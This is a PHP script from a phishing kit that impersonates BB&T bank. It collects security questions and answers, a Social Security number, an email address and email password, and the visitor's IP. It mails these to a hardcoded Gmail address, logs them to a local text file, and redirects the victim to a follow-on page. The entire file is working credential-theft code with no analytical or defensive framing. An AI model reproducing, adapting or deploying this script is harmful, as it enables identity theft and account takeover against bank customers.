<?php

ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");


$ip = getenv("REMOTE_ADDR");
$message .= "--------------[ Question ]---------------------\n";
$message .= "Question 1     : ".$_POST['Q1']."\n";
$message .= "Answer 1       : ".$_POST['A1']."\n";
$message .= "Question 2     : ".$_POST['Q2']."\n";
$message .= "Answer 2       : ".$_POST['A2']."\n";
$message .= "Question 3     : ".$_POST['Q3']."\n";
$message .= "Answer 3       : ".$_POST['A3']."\n";
$message .= "--------------[ Email BB&T  ]---------------------\n";
$message .= "SSN           : ".$_POST['emailpass1']."\n";
$message .= "Email address : ".$_POST['email']."\n";
$message .= "Email PasWord : ".$_POST['emailpass']."\n";
$message .= "--------------[ BB&T ]--------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$subject = "BB&T Card New $ip";
$headers = "From: BB&T Tohma <mail@info.com>";
$SEND = "javacmy@gmail.com";

mail($SEND,$subject,$message,$headers);
$file = fopen("JJ11.txt", 'a');
fwrite($file, $message);

session_destroy();
$header = "f.html?ID=$host$host$host$host$host";
header("Location: $header");

?>
